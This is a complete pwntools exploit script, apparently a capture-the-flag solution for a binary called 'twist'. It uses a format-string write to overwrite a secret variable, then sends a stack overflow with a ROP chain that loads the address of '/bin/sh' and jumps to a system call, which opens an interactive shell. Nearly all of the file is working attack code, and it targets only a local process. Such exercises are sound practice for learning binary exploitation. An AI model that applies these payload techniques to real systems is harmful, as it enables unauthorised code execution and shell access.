#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template twist
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('twist')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *heck+53
b *0x00401843
b do_system
b 0x4b9288
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

#def exec_fmt(payload):
#    p = process("./twist")
#    print(f'[*] Trying payload ... {payload}')
#    p.sendline(payload)
#    return p.recvall()

#autofmt = FmtStr(exec_fmt)
#offset = autofmt.offset

offset = 8
print(f'[+] FSB Offset: {offset}')

secret_addr = 0x004b8250
payload = fmtstr_payload(offset, {secret_addr:0x201})

io.sendline(payload)

junk = b'A' * 0x108
main = p64(0x004018ef)

payload = junk
payload += p64(0x000000000044def3) # pop rax
payload += p64(0x0048ad95) # addr of /bin/sh
payload += p64(0x004018b8) # addr before call system, moves rax to rdi since rdi is restricted

io.sendline(payload)

io.interactive()

